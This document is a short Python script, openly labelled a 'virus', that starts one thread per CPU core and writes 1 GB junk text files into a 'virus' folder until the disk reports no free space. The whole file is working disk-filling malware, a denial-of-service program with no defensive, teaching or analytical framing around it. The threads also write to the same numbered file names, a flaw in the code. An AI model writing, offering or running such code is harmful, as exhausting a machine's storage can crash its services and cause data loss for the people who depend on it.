import os
import shutil
import threading

# Specify the path you want to check
path = "/"

# Check if the "virus" folder exists; if not, create it
if not os.path.exists("virus"):
    os.mkdir("virus")


def create_virus():
    file_count = 0
    chunk_size = 10 * 1024 * 1024  # 10 MB per chunk
    max_size = 1024 * 1024 * 1024  # 1 GB per file

    while True:
        # Update disk usage statistics
        total, used, free = shutil.disk_usage(path)

        # Check if the disk is full
        if free <= 0:
            print("Disk is full!")
            break

        # Create a new txt file in the "virus" directory
        with open(f"virus/{file_count}.txt", "w+") as file:
            written = 0
            while written < max_size:
                file.write("10" * (chunk_size // 2))  # Write 10 MB of data per chunk || 1GB all
                written += chunk_size

        file_count += 1


# Get the number of CPU cores
num_threads = os.cpu_count()

# Create multiple threads to speed up the process
threads = []
for i in range(num_threads):
    thread = threading.Thread(target=create_virus)
    threads.append(thread)
    thread.start()

# Wait for all threads to complete
for thread in threads:
    thread.join()
